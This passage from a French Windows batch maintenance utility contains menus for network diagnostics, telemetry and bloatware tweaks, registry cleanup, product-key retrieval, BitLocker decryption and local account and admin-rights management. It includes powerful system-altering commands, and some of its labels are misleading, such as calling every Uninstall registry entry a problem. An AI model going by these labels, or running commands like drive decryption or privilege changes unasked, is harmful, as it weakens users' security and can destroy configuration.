powershell -NoProfile -Command "Get-Content '%TEMP%\netdiag_ping.txt' -Encoding OEM | ForEach-Object { $l = '   ' + $_.Trim(); Write-Host $l -ForegroundColor DarkGray; $l | Out-File -FilePath '%DIAG_LOG%' -Append -Encoding UTF8 }"
findstr /i "temps= TTL=" "%TEMP%\netdiag_ping.txt" >nul
if !errorlevel!==0 (
    echo   -^> [OK] Les serveurs DNS fonctionnent et traduisent les IP.
    echo   -^> [OK] Les serveurs DNS fonctionnent et traduisent les IP. >> "%DIAG_LOG%"
) else (
    set /a "ECHEC_COUNT+=1"
    echo   -^> [ECHEC] Probleme DNS. Impossible de se rendre sur des sites par leur nom.
    echo   -^> [ECHEC] Probleme DNS. Impossible de se rendre sur des sites par leur nom. >> "%DIAG_LOG%"
)

echo.
echo ================================
if !ECHEC_COUNT! GTR 0 (
    echo [ATTENTION] !ECHEC_COUNT! ECHEC^(s^) detecte^(s^) lors de l'analyse.
    echo Voulez-vous utiliser les outils de reparation reseau de ce script ? ^(O/N^)
    echo ================================
    echo.
    set /p rep_choix="Choix : "
    if /i "!rep_choix!"=="O" goto sys_network_menu
) else (
    echo [SUCCES] Tous les tests reseau ont ete reussis avec succes !
    echo ================================
    echo.
)
echo Appuyez sur une touche pour afficher votre configuration IP (ipconfig /all)
pause >nul
cls
echo Affichage des informations reseau (ipconfig /all)...
echo ================================ >> "%DIAG_LOG%"
echo     Rapport IPCONFIG /ALL        >> "%DIAG_LOG%"
echo ================================ >> "%DIAG_LOG%"
ipconfig /all > "%TEMP%\netdiag_ipconfig.txt"
powershell -NoProfile -Command "Get-Content '%TEMP%\netdiag_ipconfig.txt' -Encoding OEM | ForEach-Object { Write-Host $_ -ForegroundColor DarkGray; $_ | Out-File -FilePath '%DIAG_LOG%' -Append -Encoding UTF8 }"
echo.
pause
goto system_tools

:sys_cleanmgr
cls
echo Lancement du Nettoyage de disque...
cleanmgr
pause
goto system_tools

:sys_tweaks_menu
set "opts=Desactiver Telemetrie~Coupe l'espionnage et l'envoi de donnees a Microsoft"
set "opts=%opts%;Plan Performances Ultimes~Active le plan d'alimentation secret de Windows"
set "opts=%opts%;Desactiver Cortana completement~Empeche Cortana de tourner en arriere-plan"
set "opts=%opts%;Desactiver la recherche Bing~Rend le menu Demarrer beaucoup plus rapide (Local uniquement)"
set "opts=%opts%;Mode Sombre global~Force l'activation du theme sombre systeme"
set "opts=%opts%;Desactiver l'Hibernation~Libere plusieurs Giga-Octets d'espace disque (Taille de RAM)"
set "opts=%opts%;Purger les Bloatwares~Desinstalle Xbox, 3DBuilder, Skype, Zune, etc."
set "opts=%opts%;Supprimer les pubs de Windows~Retire les applications preinstallees forcees (Jeux)"

call :DynamicMenu "MENU OPTIMISATIONS WINDOWS (Tweaks)" "%opts%"
set "tw_choice=%errorlevel%"

if "%tw_choice%"=="1" goto tweak_telemetry
if "%tw_choice%"=="2" goto tweak_ultimate_power
if "%tw_choice%"=="3" goto tweak_cortana
if "%tw_choice%"=="4" goto tweak_bing
if "%tw_choice%"=="5" goto tweak_darkmode
if "%tw_choice%"=="6" goto tweak_hibernation
if "%tw_choice%"=="7" goto tweak_bloatware
if "%tw_choice%"=="8" goto tweak_ads
if "%tw_choice%"=="0" goto sys_opti_menu
goto sys_tweaks_menu

:tweak_telemetry
cls
echo [TWEAK] Desactivation de la Telemetrie Windows...
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v AllowTelemetry /t REG_DWORD /d 0 /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "DoNotShowFeedbackNotifications" /t REG_DWORD /d 1 /f >nul
sc stop DiagTrack >nul 2>&1
sc config DiagTrack start= disabled >nul 2>&1
sc stop dmwappushservice >nul 2>&1
sc config dmwappushservice start= disabled >nul 2>&1
echo Telemetrie desactivee !
pause
goto sys_tweaks_menu

:tweak_ultimate_power
cls
echo [TWEAK] Activation des Performances Ultimes Caches...
powercfg -duplicatescheme e9a42b02-d5df-448d-aa00-03f14749eb61 >nul
echo Plan d'alimentation 'Performances Ultimes' active. Allez dans vos reglages d'energie pour le selectionner.
pause
goto sys_tweaks_menu

:tweak_cortana
cls
echo [TWEAK] Desactivation complete de Cortana...
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowCortana" /t REG_DWORD /d 0 /f >nul
echo Cortana ne demarrera plus en arriere-plan.
pause
goto sys_tweaks_menu

:tweak_bing
cls
echo [TWEAK] Desactiver la recherche internet (Bing) dans le menu Demarrer...
reg add "HKCU\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v "DisableSearchBoxSuggestions" /t REG_DWORD /d 1 /f >nul
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "BingSearchEnabled" /t REG_DWORD /d 0 /f >nul
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "CortanaConsent" /t REG_DWORD /d 0 /f >nul
echo La recherche locale est desormais plus rapide et sans pub internet !
pause
goto sys_tweaks_menu

:tweak_darkmode
cls
echo [TWEAK] Activation du Mode Sombre global de Windows 11...
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v "AppsUseLightTheme" /t REG_DWORD /d 0 /f >nul
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v "SystemUsesLightTheme" /t REG_DWORD /d 0 /f >nul
echo Mode sombre applique (si pris en charge par votre version/theme).
pause
goto sys_tweaks_menu

:tweak_hibernation
cls
echo [TWEAK] Desactivation du fichier hiberfil.sys (Gain d'espace libre gigantesque)...
powercfg.exe /hibernate off >nul
echo Hibernation coupee ! Vous recuperez la taille de votre RAM en espace de stockage disque (Giga-Octets).
pause
goto sys_tweaks_menu

:tweak_bloatware
cls
echo [TWEAK] Desinstallation automatique des Bloatwares inutiles...
echo Cela peut prendre un peu de temps.
powershell -Command "Get-AppxPackage *3DBuilder* | Remove-AppxPackage" >nul 2>&1
powershell -Command "Get-AppxPackage *Getstarted* | Remove-AppxPackage" >nul 2>&1
powershell -Command "Get-AppxPackage *WindowsAlarms* | Remove-AppxPackage" >nul 2>&1
powershell -Command "Get-AppxPackage *bing* | Remove-AppxPackage" >nul 2>&1
powershell -Command "Get-AppxPackage *MicrosoftOfficeHub* | Remove-AppxPackage" >nul 2>&1
powershell -Command "Get-AppxPackage *OneNote* | Remove-AppxPackage" >nul 2>&1
powershell -Command "Get-AppxPackage *SkypeApp* | Remove-AppxPackage" >nul 2>&1
powershell -Command "Get-AppxPackage *ZuneMusic* | Remove-AppxPackage" >nul 2>&1
powershell -Command "Get-AppxPackage *ZuneVideo* | Remove-AppxPackage" >nul 2>&1
powershell -Command "Get-AppxPackage *SolitaireCollection* | Remove-AppxPackage" >nul 2>&1
echo Logiciels superflus retires avec succes !
pause
goto sys_tweaks_menu

:tweak_ads
cls
echo [TWEAK] Suppression des publicites du Menu Demarrer et des notifications Windows...
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SystemPaneSuggestionsEnabled" /t REG_DWORD /d 0 /f >nul
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SoftLandingEnabled" /t REG_DWORD /d 0 /f >nul
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SilentInstalledAppsEnabled" /t REG_DWORD /d 0 /f >nul
reg add "HKCU\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "DisableWindowsConsumerFeatures" /t REG_DWORD /d 1 /f >nul
echo Termine ! Fini les pubs de jeux preinstalles dans Windows.
pause
goto sys_tweaks_menu

:sys_registry_cleanup
cls
echo ======================================================
echo Nettoyage ^& optimisation avances du Registre
echo ======================================================
setlocal enabledelayedexpansion

set backupFolder=%SystemRoot%\Temp\RegistryBackups
if not exist "%backupFolder%" mkdir "%backupFolder%"

set logFile=%SystemRoot%\Temp\RegistryCleanupLog.txt
echo Journal de nettoyage du Registre - %date% %time% > "%logFile%"

set count=0
set safe_count=0

echo Analyse du Registre Windows pour les erreurs et problemes de performance...
for /f "tokens=*" %%A in ('reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall 2^>nul') do (
    set /a count+=1
    set entries[!count!]=%%A

    echo %%A | findstr /I "IE40 IE4Data DirectDrawEx DXM_Runtime SchedulingAgent" >nul && (
        set /a safe_count+=1
        set safe_entries[!safe_count!]=%%A
    )
)

if %count%==0 (
    echo Aucune entree superflue trouvee dans le Registre.
    pause
    goto system_tools
)

echo %count% problemes potentiels detectes dans le Registre:
for /L %%i in (1,1,%count%) do echo [%%i] !entries[%%i]!
echo.
echo Sans risque a supprimer (%safe_count% entrees detectees):
for /L %%i in (1,1,%safe_count%) do echo [%%i] !safe_entries[%%i]!
echo.
echo [A] Supprimer uniquement les entrees sures
if %safe_count% GTR 0 echo [B] Revoir les entrees sures avant suppression
echo [C] Creer une sauvegarde du Registre
echo [D] Restaurer une sauvegarde du Registre
echo [E] Verifier les corruptions du Registre
echo [0] Annuler
echo.
set /p reg_choice=Votre choix: 

for %%A in (%reg_choice%) do set reg_choice=%%A
if /i "%reg_choice%"=="0" goto sys_opti_menu
if /i "%reg_choice%"=="A" goto delete_safe_reg_entries
if /i "%reg_choice%"=="B" goto review_safe_reg_entries
if /i "%reg_choice%"=="C" goto create_reg_backup
if /i "%reg_choice%"=="D" goto restore_reg_backup
if /i "%reg_choice%"=="E" goto scan_registry
if "%reg_choice%"=="" goto sys_opti_menu

echo Saisie invalide, retour au menu.
pause
goto sys_registry_cleanup

:delete_safe_reg_entries
if %safe_count%==0 (
    echo Aucune entree sure a supprimer.
    pause
    goto sys_registry_cleanup
)
echo Suppression de toutes les entrees sures detectees...
for /L %%i in (1,1,%safe_count%) do (
    echo Suppression de !safe_entries[%%i]!...
    reg delete "!safe_entries[%%i]!" /f
    echo Supprime: !safe_entries[%%i]! >> "%logFile%"
)
echo Suppression terminee.
pause
goto sys_registry_cleanup

:review_safe_reg_entries
cls
echo Entrees du Registre sures a supprimer:
for /L %%i in (1,1,%safe_count%) do echo [%%i] !safe_entries[%%i]!
echo.
echo Voulez-vous toutes les supprimer ? (O/N)
set /p confirm_reg=
for %%A in (%confirm_reg%) do set confirm_reg=%%A
if /i "%confirm_reg%"=="Y" goto delete_safe_reg_entries
if /i "%confirm_reg%"=="O" goto delete_safe_reg_entries
echo Operation annulee.
pause
goto sys_registry_cleanup

:create_reg_backup
set backupName=RegistryBackup_%date:~-4,4%-%date:~-7,2%-%date:~-10,2%_%time:~0,2%-%time:~3,2%.reg
echo Creation de la sauvegarde: %backupFolder%\%backupName%...
reg export HKLM "%backupFolder%\%backupName%" /y
echo Sauvegarde creee avec succes.
pause
goto sys_registry_cleanup

:restore_reg_backup
echo Sauvegardes disponibles:
dir /b "%backupFolder%\*.reg"
echo Entrez le nom de la sauvegarde a restaurer:
set /p backupFile=
if exist "%backupFolder%\%backupFile%" (
    echo Restauration en cours...
    reg import "%backupFolder%\%backupFile%"
    echo Restauration effectuee avec succes.
) else (
    echo Fichier de sauvegarde introuvable. Verifiez le nom et reessayez.
)
pause
goto sys_registry_cleanup

:scan_registry
cls
echo Verification des corruptions du Registre...
sfc /scannow
dism /online /cleanup-image /checkhealth
echo Verification terminee. Si des erreurs ont ete trouvees, redemarrez votre PC.
pause
goto sys_registry_cleanup

:sys_drivers
cls
echo Enregistrement de la liste des pilotes sur le Bureau...
driverquery /v > "%USERPROFILE%\Desktop\Pilotes_installes.txt"
echo.
echo Le rapport des pilotes a ete enregistre ici :
echo %USERPROFILE%\Desktop\Pilotes_installes.txt
pause
goto sys_export_menu

:sys_diagnostic_menu
cls
set "opts=[--- ANALYSE SYSTEME ET RAPPORTS ---]"
set "opts=%opts%;Apercu de la configuration PC~Affiche les specifications et l'etat de sante materiel"
set "opts=%opts%;Rapport de temperature CPU/GPU~Affiche les temperatures en temps reel"
set "opts=%opts%;Verificateur de RAM~Slots utilises vs max supporte"
set "opts=%opts%;Diagnostic Reseau~Test de connexion (Local, Box, Internet, DNS)"
set "opts=%opts%;Rapport de Batterie~Usure, Sante et stats en temps reel"
set "opts=%opts%;Verificateur BitLocker~Verifiez l'etat de chiffrement de vos partitions"
set "opts=%opts%;Journaux d'Erreurs Windows~Affiche les erreurs critiques recentes (24h / 7 jours)"
set "opts=%opts%;Test des Composants PC~Benchmark disque, RAM, CPU et SMART en un clic"
set "opts=%opts%;Gestionnaire Windows Defender~Scan rapide/complet CLI, MAJ signatures, menaces detectees"

call :DynamicMenu "MENU DE DIAGNOSTIC SYSTEME" "%opts%"
set "diag_choice=%errorlevel%"

if "%diag_choice%"=="1" goto sys_report
if "%diag_choice%"=="2" goto sys_temp_report
if "%diag_choice%"=="3" goto sys_ram_check
if "%diag_choice%"=="4" goto sys_diag_network
if "%diag_choice%"=="5" goto sys_battery_report
if "%diag_choice%"=="6" goto sys_bitlocker_check
if "%diag_choice%"=="7" goto sys_event_log
if "%diag_choice%"=="8" goto sys_hw_test
if "%diag_choice%"=="9" goto sys_defender
if "%diag_choice%"=="0" goto system_tools

if %diag_choice% GEQ 200 (
    set /a "toggle_idx=%diag_choice%-200"
    if "!toggle_idx!"=="1" call :ToggleFav "sys_report"
    if "!toggle_idx!"=="2" call :ToggleFav "sys_temp_report"
    if "!toggle_idx!"=="3" call :ToggleFav "sys_ram_check"
    if "!toggle_idx!"=="4" call :ToggleFav "sys_diag_network"
    if "!toggle_idx!"=="5" call :ToggleFav "sys_battery_report"
    if "!toggle_idx!"=="6" call :ToggleFav "sys_bitlocker_check"
    if "!toggle_idx!"=="7" call :ToggleFav "sys_event_log"
    if "!toggle_idx!"=="8" call :ToggleFav "sys_hw_test"
    if "!toggle_idx!"=="9" call :ToggleFav "sys_defender"
)
goto sys_diagnostic_menu

:sys_report
cls
echo Diagnostic et integration de memoire en cours...
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "$os = Get-CimInstance Win32_OperatingSystem; $cpu = Get-CimInstance Win32_Processor; $bios = Get-CimInstance Win32_BIOS; $ram = Get-CimInstance Win32_ComputerSystem; $gpu = Get-CimInstance Win32_VideoController; $pm = @(Get-CimInstance Win32_PhysicalMemory); $typeInt = if ($pm.Count -gt 0) {$pm[0].SMBIOSMemoryType} else {0}; $memTypes = @{ 20='DDR'; 21='DDR2'; 22='DDR2 FB-DIMM'; 24='DDR3'; 26='DDR4'; 34='DDR5' }; $ramType = if ($memTypes.ContainsKey($typeInt)) { $memTypes[$typeInt] } else { 'Type Inconnu' }; Write-Host '   INFORMATIONS SYSTEME' -f Cyan; Write-Host ('   Nom du PC : '+$env:COMPUTERNAME); Write-Host ('   Systeme   : '+$os.Caption+' ('+$os.OSArchitecture+')'); Write-Host ('   Version   : '+$os.Version); Write-Host ''; Write-Host '   COMPOSANTS MATERIELS' -f Cyan; Write-Host ('   Processeur : '+$cpu.Name); Write-Host ('   Graphique  : '+($gpu.Name -join ', ')); Write-Host ('   Memoire    : '+[math]::Round($ram.TotalPhysicalMemory / 1GB, 2)+' Go - Type : '+$ramType) -f Yellow; Write-Host ('   BIOS Ver.  : '+$bios.SMBIOSBIOSVersion); Write-Host ''; Write-Host '   STOCKAGE (Espace libre)' -f Cyan; Get-CimInstance Win32_LogicalDisk | Where DriveType -eq 3 | foreach { $t=[math]::Round($_.Size / 1GB, 2); $f=[math]::Round($_.FreeSpace / 1GB, 2); $p=0; if($t -gt 0){$p=[math]::Round(($f/$t)*100,0)}; Write-Host ('   Disque '+$_.DeviceID+' : '+$f+' Go libres sur '+$t+' Go ('+$p+'%% restants)') -f Green }; Write-Host ''; Write-Host '   RESEAU ACTIF' -f Cyan; Get-NetAdapter | Where Status -eq 'Up' | foreach { $ip=(Get-NetIPAddress -InterfaceIndex $_.ifIndex -AddressFamily IPv4 -EA SilentlyContinue).IPAddress; Write-Host ('   '+$_.Name+' ('+$_.LinkSpeed+') - IP : '+$ip) }; Write-Host ''; Write-Host '   SECURITE' -f Cyan; try { $t=if((Get-Tpm).TpmPresent){'Present'}else{'Absent'}; Write-Host ('   Puce TPM   : '+$t) } catch { Write-Host '   Puce TPM   : Absent ou desactive' }"
echo.
pause
goto system_tools

:sys_repair_icons
cls
echo ===============================================
echo      Reparation du Cache des Icones/Miniatures
echo ===============================================
echo.
echo Arret de l'explorateur Windows...
taskkill /f /im explorer.exe >nul 2>&1
echo Reparation en cours (Suppression du cache)...
timeout /t 2 /nobreak >nul
del /A /F /Q "%localappdata%\IconCache.db" >nul 2>&1
del /A /F /Q "%localappdata%\Microsoft\Windows\Explorer\iconcache*" >nul 2>&1
del /A /F /Q "%localappdata%\Microsoft\Windows\Explorer\thumbcache*" >nul 2>&1
echo Redemarrage de l'explorateur Windows...
start explorer.exe
echo.
echo [OK] Le cache des icones a ete vide !
echo Il se reconstruira progressivement et reparera vos icones.
pause
goto sys_export_menu

REM ===================================================================
REM              MENU DES EXTRACTIONS ET SAUVEGARDES
REM ===================================================================
:sys_export_menu
cls
set "opts=[--- INFORMATIONS ET CLES ---]"
set "opts=%opts%;Cle Windows et Office~Affiche ou recupere vos differentes cles de produit"
set "opts=%opts%;Extraction des pilotes~Exporte la liste de tous les pilotes natifs installes"
set "opts=%opts%;[--- LISTES DE LOGICIELS ET RESEAUX ---]"
set "opts=%opts%;Export Liste des Logiciels~Exporte tous les programmes installes en fichier texte ou tableur"
set "opts=%opts%;[BUREAU] Export Wi-Fi + Logiciels~Genere directement 2 fichiers TXT sur le Bureau (Rapide)"

call :DynamicMenu "MENU EXTRACTION ET SAUVEGARDE" "%opts%"
set "exp_choice=%errorlevel%"

if "%exp_choice%"=="1" goto sys_win_key
if "%exp_choice%"=="2" goto sys_drivers
if "%exp_choice%"=="3" goto sys_export_software
if "%exp_choice%"=="4" goto sys_export_wifi_apps
if "%exp_choice%"=="0" goto system_tools

if %exp_choice% GEQ 200 (
    set /a "toggle_idx=%exp_choice%-200"
    if "!toggle_idx!"=="1" call :ToggleFav "sys_win_key"
    if "!toggle_idx!"=="2" call :ToggleFav "sys_drivers"
    if "!toggle_idx!"=="3" call :ToggleFav "sys_export_software"
    if "!toggle_idx!"=="4" call :ToggleFav "sys_export_wifi_apps"
)
goto sys_export_menu

:sys_win_key
set "opts=Cle Windows OEM (Incrustee au BIOS);Cle Windows Actuelle (Installee);Cle Produit Office (via CMD)"
call :DynamicMenu "RECUPERATION DE CLES DE PRODUIT" "%opts%"
set "wk_choice=%errorlevel%"

if "%wk_choice%"=="1" goto win_key_oem
if "%wk_choice%"=="2" goto win_key_registry
if "%wk_choice%"=="3" goto win_key_office
if "%wk_choice%"=="0" goto sys_export_menu
goto sys_win_key

:win_key_oem
cls
echo ===============================================
echo      Cle Windows OEM (Carte mere / BIOS)
echo ===============================================
echo.
echo Interrogation du firmware...
powershell -NoProfile -Command "$k = (Get-CimInstance -Query 'Select * from SoftwareLicensingService' -ErrorAction SilentlyContinue).OA3xOriginalProductKey; if([string]::IsNullOrWhiteSpace($k)) { Write-Host '[ECHEC] Aucune cle OEM detectee.' ; Write-Host 'Cela signifie que ce PC ne contenait pas de licence incluse a l''achat' ; Write-Host 'ou utilise une licence numerique liee a un compte Microsoft.' } else { Write-Host '[OK] Cle de produit Windows (OEM) detectee :'; Write-Host ''; Write-Host ('    ' + $k) -ForegroundColor Green; Write-Host ''; Write-Host 'Cette cle est incrustee dans la carte mere.' }"
echo.
pause
goto sys_win_key

:win_key_registry
cls
echo ===============================================
echo      Cle Windows Installee (Registre)
echo ===============================================
echo.
echo Recherche de la cle actuellement utilisee par Windows...
set "WINKEY="
for /f "tokens=3" %%A in ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform" /v BackupProductKeyDefault 2^>nul ^| findstr /i "BackupProductKeyDefault"') do (
    set "WINKEY=%%A"
)
if "!WINKEY!"=="" (
    echo [ECHEC] Impossible de lire la cle par defaut dans le registre.
) else (
    echo [OK] Cle Windows installee :
    echo.
    powershell -NoProfile -Command "Write-Host '    !WINKEY!' -ForegroundColor Green"
    echo.
)
pause
goto sys_win_key

:win_key_office
cls
echo ===============================================
echo      Cle de produit Microsoft Office
echo ===============================================
echo.
echo Recherche des licences Office installees...
echo.
set "office_vbs="
if exist "%ProgramFiles%\Microsoft Office\Office16\ospp.vbs" set "office_vbs=%ProgramFiles%\Microsoft Office\Office16\ospp.vbs"
if exist "%ProgramFiles(x86)%\Microsoft Office\Office16\ospp.vbs" set "office_vbs=%ProgramFiles(x86)%\Microsoft Office\Office16\ospp.vbs"

if "!office_vbs!"=="" (
    echo [INFO] Script de statut Office non trouve ^(ospp.vbs^).
    echo Si Office est installe, sa version est peut-etre differente ^(pas 2016/2019/365^).
) else (
    echo [INFO] Depuis Office 2013, Microsoft masque volontairement
    echo la cle de licence complete sur votre ordinateur par securite.
    echo Seuls les 5 derniers caracteres sont stockes sur ce PC.
    echo.
    powershell -NoProfile -Command "$raw = cscript //nologo '!office_vbs!' /dstatus; $matches = $raw | Select-String -Pattern 'KEY'; if ($matches) { foreach($m in $matches) { Write-Host '   '$m.Line.Trim() -ForegroundColor Cyan } } else { Write-Host 'Aucune cle detectee ou en mode Abonnement / Inactif.' -ForegroundColor Yellow }"
)
echo.
pause
goto sys_win_key

:sys_god_mode
cls
echo ===============================================
echo      Creation du dossier "God Mode"
echo ===============================================
echo.
echo Le "God Mode" centralise tous les parametres de Windows
echo (+ de 200 options^) dans un seul et meme dossier.
echo.
set "GODMODE_PATH=%USERPROFILE%\Desktop\God Mode.{ED7BA470-8E54-465E-825C-99712043E01C}"
if exist "!GODMODE_PATH!" (
    echo [INFO] Le dossier God Mode existe deja sur votre Bureau.
) else (
    mkdir "!GODMODE_PATH!" >nul 2>&1
    if !errorlevel!==0 (
        echo [OK] Le dossier God Mode a ete cree sur votre Bureau !
    ) else (
        echo [ECHEC] Impossible de creer le dossier.
    )
)
echo.
pause
goto system_tools

:sys_battery_report
cls
echo ===============================================
echo      Rapport de Batterie (Sante et Usure)
echo ===============================================
echo.
echo Generation du rapport en cours...
powercfg /batteryreport /output "%USERPROFILE%\Desktop\battery_report.html" >nul 2>&1
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "$r='%USERPROFILE%\Desktop\battery_report.html';if(Test-Path $r){$c=Get-Content $r -Raw;$d=0;$f=0;if($c -match '(?s)DESIGN CAPACITY.*?([\d\s,\xA0]+)\s*mWh'){$d=[int]($matches[1] -replace '\D','')};if($c -match '(?s)FULL CHARGE CAPACITY.*?([\d\s,\xA0]+)\s*mWh'){$f=[int]($matches[1] -replace '\D','')};if($d -gt 0){$h=[math]::Round(($f/$d)*100,2);if($h -gt 100){$h=100};$w=[math]::Round(100-$h,2);if($w -lt 0){$w=0};Write-Host ('  - Capacite d''usine : '+$d+' mWh') -f Cyan;Write-Host ('  - Capacite actuelle : '+$f+' mWh') -f Cyan;Write-Host ('  - Sante de la batterie : '+$h+'%%') -f Green;Write-Host ('  - Niveau d''usure : '+$w+'%%') -f Yellow}else{Write-Host 'Impossible de lire les donnees de capacite. (PC Fixe ou pas de batterie ?)' -f Red}}else{Write-Host 'Le fichier de rapport n''a pas pu etre cree.' -f Red}"
echo.
echo Le rapport complet (Historique, Cycles) est sur votre Bureau:
echo battery_report.html
echo.
pause
goto system_tools

:sys_bitlocker_check
cls
echo ===============================================
echo     Verification chiffrement BitLocker / Dechiffrage
echo ===============================================
echo.

set "vol_opts="
set "vol_count=0"
for /f "tokens=1,* delims=|" %%A in ('powershell -NoProfile -Command "Get-CimInstance Win32_LogicalDisk | Where-Object {($_.DriveType -eq 3 -or $_.DriveType -eq 2) -and $_.Size -gt 0} | ForEach-Object { $_.DeviceID + '|Lecteur ' + $_.DeviceID + ' ' + $_.VolumeName + ' (' + [math]::Round($_.Size/1GB,1) + ' Go)' }"') do (
    set /a vol_count+=1
    set "vol_letter[!vol_count!]=%%A"
    set "single_vol=%%A"
    if defined vol_opts (
        set "vol_opts=!vol_opts!;%%B"
    ) else (
        set "vol_opts=%%B"
    )
)

if !vol_count! equ 0 (
    echo [ECHEC] Aucun lecteur local detecte.
    pause
    goto system_tools
)

if !vol_count! equ 1 (
    set "dl=!single_vol!"
) else (
    call :DynamicMenu "CHOISISSEZ LE LECTEUR A VERIFIER" "!vol_opts!"
    set "v_choice=!errorlevel!"
    if "!v_choice!"=="0" goto system_tools
    
    for %%I in (!v_choice!) do set "dl=!vol_letter[%%I]!"
)

cls
echo Verification du statut BitLocker pour !dl! ...
manage-bde -status !dl! > "%TEMP%\bde_status.txt" 2>&1
type "%TEMP%\bde_status.txt"

rem Detection fiable (compatible FR/EN) pour eviter de proposer de dechiffrer un lecteur deja clair.
powershell -NoProfile -ExecutionPolicy Bypass -Command "$src=Get-Content '%TEMP%\bde_status.txt' -Raw; if ($src -match 'Protection\s+On' -or $src -match 'Protection\s+activ' -or $src -match '100\.0\s*%%' -or $src -match '100\,0\s*%%') { exit 1 } else { exit 0 }"
if !errorlevel! equ 0 (
    echo.
    echo Ce lecteur ne semble pas chiffre ou n'a pas termine de l'etre. 
    echo Aucune action necessaire.
    pause
    goto system_tools
)

echo.
set /p confirm_dec=Le lecteur est chiffre. Voulez-vous lancer le dechiffrement maintenant ? (O/N): 
if /i "%confirm_dec%"=="O" (
    echo Lancement du dechiffrement de %dl% ...
    manage-bde -off %dl%
    echo Commande envoyee. Le processus peut prendre du temps.
    pause
    goto system_tools
) else (
    echo Operation annulee.
    pause
    goto system_tools
)

REM ================= Embedded: Gestion des utilisateurs locaux (um_*) =================
:um_menu
setlocal ENABLEEXTENSIONS ENABLEDELAYEDEXPANSION
for /f "usebackq tokens=*" %%G in (`powershell -NoProfile -Command "$n=([System.Security.Principal.SecurityIdentifier]::new('S-1-5-32-544')).Translate([System.Security.Principal.NTAccount]).Value.Split('\\')[-1]; Write-Output $n"`) do set "UM_ADMIN_GROUP=%%G"
if not defined UM_ADMIN_GROUP set "UM_ADMIN_GROUP=Administrators"
net localgroup "%UM_ADMIN_GROUP%" >nul 2>&1 || set "UM_ADMIN_GROUP=Administrateurs"
set "UM_STR_PWD_REQ_EN=Password required"
set "UM_STR_PWD_REQ_FR=Mot de passe requis"

set "opts=Lister les utilisateurs;Ajouter un utilisateur;Supprimer un utilisateur;Gerer les droits (Standard/Admin);Ajouter/Modifier un mot de passe;Supprimer le mot de passe (Auto-login)"
call :DynamicMenu "GESTION UTILISATEURS LOCAUX" "%opts%"
set "um_choice=%errorlevel%"

if "%um_choice%"=="1" goto um_list
if "%um_choice%"=="2" goto um_add
if "%um_choice%"=="3" goto um_del
if "%um_choice%"=="4" goto um_admin
if "%um_choice%"=="5" goto um_reset
if "%um_choice%"=="6" goto um_remove_pwd
if "%um_choice%"=="0" goto um_exit
goto um_menu

:um_list
cls
echo Utilisateur           Admin   Actif   MDPDefini
echo ------------------------------------------------
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop'; $adminGroups=@('Administrators','Administrateurs'); $admins=@(); foreach($g in $adminGroups){ try{ $admins+=$(Get-LocalGroupMember -Group $g -ErrorAction Stop | ForEach-Object { $_.Name.Split('\\')[-1] }) } catch{} }; $admins = $admins | Sort-Object -Unique; Get-LocalUser | Where-Object Enabled | Sort-Object Name | ForEach-Object { $u=$_; $has=$false; try { $pls = $u | Select-Object -ExpandProperty PasswordLastSet -ErrorAction Stop; if ($pls) { $has=$true } } catch {}; if (-not $has) { try { $nu = net user \"$($u.Name)\" 2>$null; $line = $nu | Where-Object { $_ -match '^(Password last set|Dernier changement du mot de passe)\s+' }; if ($line) { $val = ($line -split '\\s{2,}',2)[1].Trim(); if ($val -and $val -notmatch '^(Never|Jamais)$') { $has=$true } } } catch {} }; if (-not $has -and $u.PasswordRequired) { $has=$true }; [PSCustomObject]@{ Utilisateur=$u.Name; Admin= if($admins -contains $u.Name){'Oui'}else{'Non'}; Actif= if($u.Enabled){'Oui'}else{'Non'}; MDPDefini= if($has){'Oui'}else{'Non'} } } | Format-Table -AutoSize -HideTableHeaders" || echo Erreur lors de la liste
echo.
pause
goto um_menu

:um_admin
cls
set "user_opts="
set /a u_idx=0
for /f "tokens=*" %%U in ('powershell -NoProfile -Command "Get-LocalUser | Where-Object Enabled | Select-Object -ExpandProperty Name"') do (
    if defined user_opts (set "user_opts=!user_opts!;%%U") else (set "user_opts=%%U")
    set /a u_idx+=1
    set "user_arr[!u_idx!]=%%U"
)
if not defined user_opts (
    echo Aucun utilisateur actif trouve.
    pause
    goto um_menu
)

call :DynamicMenu "AJOUT/RETRAIT DROITS ADMIN" "%user_opts%"
set "res=%errorlevel%"
if "%res%"=="0" goto um_menu

set "UADM=!user_arr[%res%]!"
if not defined UADM goto um_menu

set "opts=Ajouter aux Administrateurs;Retirer des Administrateurs"
call :DynamicMenu "ACTION POUR !UADM!" "%opts%"
set "OP=%errorlevel%"

if "%OP%"=="1" (
    net localgroup "%UM_ADMIN_GROUP%" "%UADM%" /add
    if !errorlevel!==0 (echo '%UADM%' a ete ajoute aux Administrateurs.) else (echo Echec.)
) else if "%OP%"=="2" (
    net localgroup "%UM_ADMIN_GROUP%" "%UADM%" /delete
    if !errorlevel!==0 (echo '%UADM%' a ete retire des Administrateurs.) else (echo Echec.)
)
pause
goto um_menu


:um_add
cls
call :um_show_active
set "NEWU="
set /p NEWU="Nom d'utilisateur a ajouter > "
if "%NEWU%"=="" goto um_menu
set "SETPWD="
set /p SETPWD="Affecter un mot de passe maintenant ? (O/N) > "
if /I not "%SETPWD%"=="O" goto um_add_no_pwd

set "NEWP="
set /p NEWP="Mot de passe > "
